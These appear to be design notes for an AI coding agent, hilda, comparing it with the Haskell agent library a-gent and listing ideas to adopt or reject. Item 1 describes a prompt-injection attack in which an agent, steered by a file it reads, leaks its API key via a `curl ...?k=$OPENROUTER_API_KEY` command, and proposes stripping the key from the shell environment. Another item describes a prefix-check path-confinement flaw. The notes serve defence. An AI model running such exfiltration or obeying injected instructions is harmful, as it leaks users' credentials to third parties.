# Ideas from other agents

## a-gent

Source: <https://gitlab.com/a-gent/a-gent>, read at commit "Added multitasking (LLM batching)" (2026-07-11).

a-gent is a Haskell library. The user writes a script against it, picks the files sent as context (the "pile"), and the model returns whole files. It has no tool calling and no shell tool.

License: SSPL-1.0 or AGPL-3.0-only. hilda is MIT, so take ideas only, not code.

### Worth adopting

1. **Keep the API key out of `bash`.** a-gent's `todo.org` describes this attack: a model reads the LLM keys from the environment and sends them to a third-party server. In hilda, `runShell` (`src/Hilda/Tools.hs`) sets no `env`. As a result, `bash -c` inherits `OPENROUTER_API_KEY` or the `--api-key-env` variable. In `yolo` mode, a prompt injection in a file the model reads can run `curl ...?k=$OPENROUTER_API_KEY`. Fix: pass the child process an environment without the active key variable.

2. **Writes on a git branch.** a-gent's `/atom` command works in these steps:
   - It creates a worktree on a new branch named by UTC timestamp.
   - It writes the files there, commits them and removes the worktree.
   - It records `[CODE] <desc>` or `[FAIL] <desc>` in `branch.<ts>.description`.

   The user reviews and merges the branch. In hilda, `bash` also writes files, so the whole session must run in the worktree. `git worktree add ../x && cd ../x && hilda` already gives this isolation. A `--worktree` flag is justified only by the automatic commit and description.

3. **A model per role.** a-gent gives its Plan and Code modes separate endpoints and keys (`llmPlanAPI`, `llmCodeAPI`). In hilda this would mean a cheap model for reading and a stronger one for edits. The 0.1.1 measurements show a 7x cost spread between models on one task. Whether a cheap model's plans are good enough is not measured.

4. **User-attached context.** a-gent sends only files the user chose. The model does not search for context. hilda's open TODO is thrashing under `--context-budget 6000`: re-reads, and reads of files that do not exist. Attaching files up front would reduce what the model has to find. Its effect on thrashing is untested.

### Not worth adopting

- **Effect typeclasses with Safe Haskell** (`Agent.IO.Effects`, `Internal.RIO`). The types prove which effects each mode may perform. hilda's `bash` tool gives the model every effect at run time, so a type-level proof about `write` says nothing about what the model can do. `authorize` in `Hilda.Policy` fits a shell-capable agent.
- **IFC/MAC modules** (`Agent.Control.IFC`, `Agent.Control.MAC`). These are information-flow and mandatory-access-control types. No other module imports them.
- **`LLM_SIGN_SHA` self-hash check.** It runs `sha256sum` and `pwd` from `PATH` and compares the result to an env var. Anyone who can edit the script can also change that env var or `PATH`.
- **`smock.sh`**, an `nc` loop that returns one fixed JSON reply. `test/FakeServer.hs` does more.
- **Path confinement by `isPrefixOf`** in `llmCodeGet`. It checks the prefix with no trailing separator, so root `/repo/src` also accepts `/repo/src2/...`. Avoid this pattern if hilda adds confinement.

### Not yet examined

- `/task` batching: `Agent.Control.Concurrent` runs one prompt per piled file in forked threads. This is relevant if hilda adds parallel tool dispatch.
